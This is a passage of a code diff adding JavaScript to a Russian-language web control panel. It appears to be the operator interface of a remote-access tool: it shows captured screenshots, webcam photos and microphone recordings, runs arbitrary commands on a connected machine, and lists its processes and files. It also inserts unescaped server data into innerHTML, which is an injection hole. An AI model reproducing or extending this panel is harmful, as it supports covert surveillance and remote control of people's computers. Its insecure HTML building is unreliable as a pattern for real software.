+                        <audio controls src="${url}" style="width: 100%; margin-bottom: 15px;"></audio>
+                        <button onclick="this.closest('.modal').remove()" class="btn btn-primary">Закрыть</button>
+                    </div>
+                `;
+                document.body.appendChild(modal);
+                
+                showStatus('✅ Запись готова', 'success');
+                setTimeout(() => refreshMedia(), 1000);
+            } catch (error) {
+                showStatus('❌ Ошибка записи', 'error');
+            }
+        }
+
+        function showImageModal(url) {
+            const modal = document.createElement('div');
+            modal.className = 'modal';
+            const img = document.createElement('img');
+            img.src = url;
+            const close = document.createElement('div');
+            close.className = 'modal-close';
+            close.innerHTML = '✕';
+            close.onclick = () => document.body.removeChild(modal);
+            modal.appendChild(img);
+            modal.appendChild(close);
+            modal.onclick = (e) => { if (e.target === modal) document.body.removeChild(modal); };
+            document.body.appendChild(modal);
+        }
+
+        async function refreshMedia() {
+            try {
+                const data = await apiRequest('/api/media/list');
+                if (data && data.success) {
+                    document.getElementById('screenshotsCount').textContent = data.screenshots.length;
+                    let screenshotsHtml = '';
+                    if (data.screenshots.length > 0) {
+                        data.screenshots.forEach(s => {
+                            screenshotsHtml += `
+                                <div class="media-item" onclick="window.open('${s.url}', '_blank')">
+                                    <img src="${s.url}" alt="screenshot">
+                                    <div class="media-info">${s.time}</div>
+                                </div>
+                            `;
+                        });
+                    } else {
+                        screenshotsHtml = '<div class="media-empty">Нет скриншотов</div>';
+                    }
+                    document.getElementById('screenshotsList').innerHTML = screenshotsHtml;
+                    
+                    document.getElementById('webcamCount').textContent = data.webcam.length;
+                    let webcamHtml = '';
+                    if (data.webcam.length > 0) {
+                        data.webcam.forEach(w => {
+                            webcamHtml += `
+                                <div class="media-item" onclick="window.open('${w.url}', '_blank')">
+                                    <img src="${w.url}" alt="webcam">
+                                    <div class="media-info">${w.time}</div>
+                                </div>
+                            `;
+                        });
+                    } else {
+                        webcamHtml = '<div class="media-empty">Нет фото</div>';
+                    }
+                    document.getElementById('webcamList').innerHTML = webcamHtml;
+                    
+                    document.getElementById('audioCount').textContent = data.audio.length;
+                    let audioHtml = '';
+                    if (data.audio.length > 0) {
+                        data.audio.forEach(a => {
+                            audioHtml += `
+                                <div class="media-item">
+                                    <audio controls src="${a.url}"></audio>
+                                    <div class="media-info">${a.time}</div>
+                                </div>
+                            `;
+                        });
+                    } else {
+                        audioHtml = '<div class="media-empty">Нет записей</div>';
+                    }
+                    document.getElementById('audioList').innerHTML = audioHtml;
+                }
+            } catch (error) {
+                console.error('Ошибка обновления медиатеки:', error);
+            }
+        }
+
+        // ==================== КОМАНДЫ ====================
+        function runCustomCommand() {
+            const cmd = document.getElementById('customCmd').value;
+            if (cmd) sendCommand('cmd', { cmd });
+        }
+
+        function quickCmd(cmd) {
+            document.getElementById('customCmd').value = cmd;
+            runCustomCommand();
+        }
+
+        // ==================== ВКЛАДКИ ====================
+        function switchTab(tab) {
+            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+            event.target.classList.add('active');
+            document.getElementById(`tab-${tab}`).classList.add('active');
+            
+            if (tab === 'media') refreshMedia();
+            if (tab === 'files') listFiles();
+            if (tab === 'processes') sendCommand('processes');
+            if (tab === 'main') sendCommand('system');
+        }
+
+        // Инициализация
+        setTimeout(() => {
+            testConnection();
+        }, 500);
+        setInterval(testConnection, 30000);
     </script>
 </body>
 </html>
